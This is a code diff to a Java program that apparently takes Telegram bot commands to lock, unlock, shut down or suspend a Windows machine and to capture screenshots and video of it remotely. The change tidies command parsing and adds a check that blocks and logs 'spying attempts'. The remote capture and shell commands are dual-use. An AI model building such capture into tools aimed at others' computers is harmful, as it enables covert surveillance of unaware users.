@@ -284,38 +284,48 @@ public class Main {
     }
 
     private static void handleRemoteCommand(String command) {
+        if (command == null) return;
         try {
+            // Normalize spaces (e.g. "/ recording" -> "/recording")
+            String cleanCmd = command.trim().replaceAll("^/\\s+", "/");
+            String lowerCmd = cleanCmd.toLowerCase();
+            
             boolean kavach = (securityService != null && securityService.isKavachActive());
             
-            if (kavach && (command.contains("screenshot") || command.contains("record"))) {
-                sendTelegramMessage("🛡️ *3rd AI KAVACH ALERT:* An unauthorized spying attempt (" + command + ") was BLOCKED and reported to AI Police.");
-                securityService.addLog("KOCKROACH", "SPYING ATTEMPT", "Unauthorized " + command + " blocked by Kavach on " + System.getProperty("user.name"), null, TARGET_ID);
+            if (kavach && (lowerCmd.contains("screenshot") || lowerCmd.contains("record") || lowerCmd.contains("recording"))) {
+                sendTelegramMessage("🛡️ *3rd AI KAVACH ALERT:* An unauthorized spying attempt (" + cleanCmd + ") was BLOCKED and reported to AI Police.");
+                securityService.addLog("KOCKROACH", "SPYING ATTEMPT", "Unauthorized " + cleanCmd + " blocked by Kavach on " + System.getProperty("user.name"), null, TARGET_ID);
                 return;
             }
 
-            if (command.equals("/lock")) {
+            if (lowerCmd.equals("/lock")) {
                 remoteLock();
                 sendTelegramMessage("🔐 *System LOCKED successfully.*");
             }
-            else if (command.equals("/unlock")) {
+            else if (lowerCmd.equals("/unlock")) {
                 remoteUnlock();
                 sendTelegramMessage("🔓 *System UNLOCKED successfully.*");
             }
-            else if (command.equals("/screenshot")) {
+            else if (lowerCmd.equals("/screenshot")) {
                 sendTelegramMessage("📸 *Capturing screenshot...*");
                 takeScreenshot("manual_" + System.currentTimeMillis() + ".jpg");
             }
-            else if (command.equals("/shutdown")) {
+            else if (lowerCmd.equals("/shutdown")) {
                 sendTelegramMessage("🔌 *Shutting down...*");
                 Runtime.getRuntime().exec("shutdown /s /t 5");
             }
-            else if (command.equals("/sleep")) {
+            else if (lowerCmd.equals("/sleep")) {
                 sendTelegramMessage("🌙 *Putting system to sleep...*");
                 Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
             }
-            else if (command.startsWith("/record")) {
+            else if (lowerCmd.startsWith("/record")) {
                 int secs = 10;
-                try { secs = Integer.parseInt(command.split(" ")[1]); } catch (Exception ignored) {}
+                String[] parts = cleanCmd.split("\\s+");
+                if (parts.length > 1) {
+                    try {
+                        secs = Integer.parseInt(parts[1]);
+                    } catch (NumberFormatException ignored) {}
+                }
                 sendTelegramMessage("🎥 *Started recording " + secs + "s...*");
                 recordVideo(secs);
             }
